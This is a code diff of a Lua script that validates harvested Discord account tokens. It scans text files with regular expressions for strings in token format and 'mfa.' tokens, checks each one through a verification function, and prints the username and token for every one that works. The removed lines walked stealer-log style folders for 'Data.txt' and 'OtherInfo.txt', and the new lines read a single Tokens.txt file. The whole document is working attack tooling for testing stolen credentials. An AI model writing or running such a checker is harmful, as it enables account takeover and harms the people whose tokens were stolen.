@@ -1,6 +1,5 @@
 local Https = require("coro-http")
 local Json = require("json")
-local fs = require("fs")
 local Path = "Tokens.txt"
 
 local function readFile(FileName)
@@ -23,21 +22,13 @@ local function VerifyToken(Token)
 end
 
 coroutine.wrap(function()
-    for _,FolderN in pairs(fs.readdirSync(Path)) do
-        if FolderN ~= "DontScan" then
-            for _,File in pairs(fs.readdirSync(Path.."\\"..FolderN)) do
-                if File == "Data.txt" or File == "OtherInfo.txt" then
-                    local Data = readFile(Path..FolderN.."\\"..File)
-                    if Data then
-                        local Found = Data:match("[%w-_]+[.][%w-_]+[.][%w-_]+") or Data:match("mfa[.][%w-_]+")
-                        if type(Found) == "string" and string.len(Found) > 11 then -- fuck proper pattern matching lol
-                            local User = VerifyToken(Found)
-                            if User then
-                                print(User.." "..Found)
-                            end
-                        end
-                    end
-                end
+	local Data = readFile(Path)
+	if Data then
+		local Found = Data:match("[%w-_]+[.][%w-_]+[.][%w-_]+") or Data:match("mfa[.][%w-_]+")
+		if type(Found) == "string" and string.len(Found) > 11 then -- fuck proper pattern matching lol
+			local User = VerifyToken(Found)
+			if User then
+				print(User.." "..Found)
             end
         end
     end
